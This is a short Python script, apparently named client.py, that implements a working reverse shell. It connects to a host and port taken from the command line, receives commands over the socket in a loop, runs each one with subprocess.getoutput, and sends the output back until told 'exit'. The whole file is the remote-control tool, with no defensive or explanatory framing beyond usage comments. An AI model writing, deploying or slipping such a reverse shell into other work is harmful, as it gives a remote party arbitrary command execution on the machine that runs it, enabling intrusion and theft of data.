import socket # network stuff
import sys # command line input 
import subprocess # run other programs

# input host ip address and port number at the command line like:
# python client.py 0.0.0.0 5050

HOST = sys.argv[1] 
PORT = int(sys.argv[2])

def main():
    with socket.socket() as s:
        s.connect((HOST, PORT))
        stay_open = True
        while stay_open:
            # data is sent & received in bytes
            # needs decoding
            command = s.recv(1024).decode('utf-8') 
            if command == 'exit':
                stay_open = False
            try:
                command = subprocess.getoutput(command)
                s.send(command.encode())
            except:
                pass




if __name__ == '__main__':
    main()
